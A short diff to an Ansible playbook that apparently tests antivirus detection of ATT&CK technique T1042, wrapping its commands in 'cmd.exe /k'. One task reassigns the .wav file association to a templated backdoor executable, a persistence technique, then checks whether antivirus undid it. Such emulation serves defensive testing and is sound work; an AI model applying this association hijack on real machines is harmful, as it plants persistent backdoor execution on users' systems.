@@ -7,7 +7,7 @@
     - name: change .wav file execution
       tags: always
       win_command: |
-        assoc .wav={{ backdoor_exe }}
+        cmd.exe /k assoc .wav={{ backdoor_exe }}
         
     - name: sleep for 10 seconds and continue with play to check if AV removed or Not
       tags: always
@@ -17,7 +17,7 @@
     - name: Check new assoc
       tags: always
       win_command: |
-        assoc .wav
+        cmd.exe /k assoc .wav
       register: T1042
       
     - name: check if playbook was blocked
